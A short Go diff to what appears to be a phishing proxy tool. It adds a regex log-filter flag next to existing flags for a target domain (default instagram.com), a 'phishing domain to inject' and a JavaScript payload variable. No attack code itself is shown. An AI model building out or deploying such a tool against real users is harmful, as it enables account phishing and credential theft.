@@ -3,6 +3,7 @@ package main
 import (
 	"flag"
 	"fmt"
+	"strings"
 )
 
 type VerbosityLevel int
@@ -18,6 +19,7 @@ var (
 	targetDomain   string
 	phishingDomain string
 	jsPayload      string
+	logFilters     []string
 	verbosity      VerbosityLevel
 )
 
@@ -25,6 +27,12 @@ func init() {
 	// Domain flags
 	flag.StringVar(&targetDomain, "target", "instagram.com", "Original target domain")
 	flag.StringVar(&phishingDomain, "phishing", "localhost", "Phishing domain to inject")
+	flag.Func("filter", "Comma-separated regex patterns", func(s string) error {
+		if s != "" {
+			logFilters = strings.Split(s, ",")
+		}
+		return nil
+	})
 
 	// Verbosity flags
 	flag.Var(&verbosityFlag{}, "verbose", "Log level [original|modified|all]")
